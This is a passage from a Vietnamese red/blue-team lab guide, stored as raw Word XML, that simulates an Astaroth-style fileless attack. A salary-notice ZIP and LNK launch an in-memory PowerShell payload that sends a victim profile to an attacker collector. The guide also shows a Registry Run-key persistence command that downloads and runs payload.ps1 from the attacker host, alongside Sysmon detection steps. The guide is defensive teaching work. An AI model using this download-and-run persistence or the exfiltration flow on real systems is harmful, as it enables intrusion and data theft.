          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Khi không gửi được dữ liệu về attacker, payload mô phỏng hành vi staging/cache dữ liệu thu thập được ở thư mục user-writable để chờ gửi lại.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>14.3. Có mạng lại và gửi queue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bật lại collector server:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cd C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>python .\collect_server.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chạy lại LNK hoặc đăng xuất/đăng nhập lại để Registry Run key mô phỏng persistence kích hoạt lại payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kỳ vọng trên attacker:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /collect HTTP/1.1 200</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>[COLLECT] Saved victim profile to C:\Fileless-Lab\collections\victim-profile-...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sau khi gửi thành công, kiểm tra lại trên victim:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dir "$env:TEMP\FilelessLab\queue"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Các file queue đã gửi thành công sẽ bị xóa.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>15. Kiểm tra payload có tồn tại trên victim không</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là phần quan trọng nhất của lab.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên victim chạy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Get-ChildItem C:\ -Filter payload.ps1 -Recurse -ErrorAction SilentlyContinue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kiểm tra tiếp:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Get-ChildItem C:\ -Filter payload.exe -Recurse -ErrorAction SilentlyContinue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Get-ChildItem C:\ -Filter payload.dll -Recurse -ErrorAction SilentlyContinue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Get-ChildItem C:\ -Filter payload.b64 -Recurse -ErrorAction SilentlyContinue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Get-ChildItem C:\ -Filter payload-decoded.ps1 -Recurse -ErrorAction SilentlyContinue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kỳ vọng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> liên quan đến lab trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.dll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Victim vẫn có:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Có thể có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue\victim-profile-*.json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> nếu trước đó mất mạng.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Vì vậy không được viết rằng “không có file nào tồn tại trên victim”. Câu đúng là:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Payload không được lưu thành file trên victim. ZIP và LNK chỉ đóng vai trò initial-access/launcher.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nói ngắn gọn:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ZIP     = delivery</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>LNK     = launcher</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload = memory only</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là fileless payload execution, không phải zero-file attack.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>16. Kiểm tra persistence mô phỏng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên victim, kiểm tra Registry Run key:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object FilelessLabDemo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Kỳ vọng thấy value </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FilelessLabDemo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">. Value này gọi PowerShell để tải lại </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> từ attacker khi user đăng nhập lại. Trong lab, mục đích là mô phỏng retry gửi queue khi mạng đã quay lại.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>powershell.exe -NoProfile -Command "try { ... Invoke-RestMethod 'http://192.168.141.1:8000/payload.ps1' ... } catch { }"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý nghĩa:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Astaroth thật có thể dùng nhiều kỹ thuật để duy trì khả năng bám trụ hoặc tiếp tục hoạt động.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lab chỉ mô phỏng ý tưởng persistence bằng Registry Run key dễ thấy, dễ kiểm tra và dễ xóa.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là điểm tạo thêm log để blue team phân tích Registry modification.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Cleanup persistence:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "FilelessLabDemo" -ErrorAction SilentlyContinue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>17. Phân tích Sysmon Event ID 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Mở:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event Viewer</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Applications and Services Logs</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Microsoft</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Sysmon</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">          Operational</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Filter:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event ID 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Tìm:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Quan sát:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Image.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>CommandLine.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>ParentImage.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>ProcessId.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>ParentProcessId.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>User.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>UtcTime.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Process tree mong đợi:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>explorer.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; powershell.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là dấu hiệu đáng chú ý: người dùng mở shortcut từ Explorer nhưng tiến trình được sinh ra lại là PowerShell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>18. Phân tích Sysmon Event ID 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Filter:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event ID 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Tìm event có:</w:t>
